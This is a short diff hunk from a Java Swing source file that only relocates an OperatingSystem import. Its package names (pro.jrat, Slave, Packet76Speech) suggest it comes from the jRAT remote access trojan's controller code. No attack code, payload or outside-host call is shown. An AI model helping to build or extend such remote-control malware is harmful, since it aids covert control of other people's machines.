@@ -20,10 +20,10 @@ import javax.swing.SwingConstants;
 import pro.jrat.ErrorDialog;
 import pro.jrat.Main;
 import pro.jrat.Slave;
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.packets.outgoing.Packet76Speech;
 import pro.jrat.utils.IOUtils;
 
-import com.redpois0n.common.OperatingSystem;
 
 
 @SuppressWarnings("serial")
